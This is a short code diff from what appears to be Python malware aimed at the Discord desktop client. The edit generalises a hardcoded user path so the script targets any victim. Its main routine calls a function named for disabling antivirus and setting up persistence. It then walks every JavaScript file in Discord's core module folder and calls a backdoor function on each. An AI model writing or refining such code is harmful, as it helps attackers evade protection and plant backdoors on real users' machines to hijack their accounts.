@@ -48,7 +48,7 @@ def disableAvAndPersistance():
 
 def main():
     disableAvAndPersistance()
-    path = "C:\\Users\\nullb\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\"
+    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\"
     my_path = Path(path)
     for file in my_path.glob("**/*.js"):
         backdoor(file)
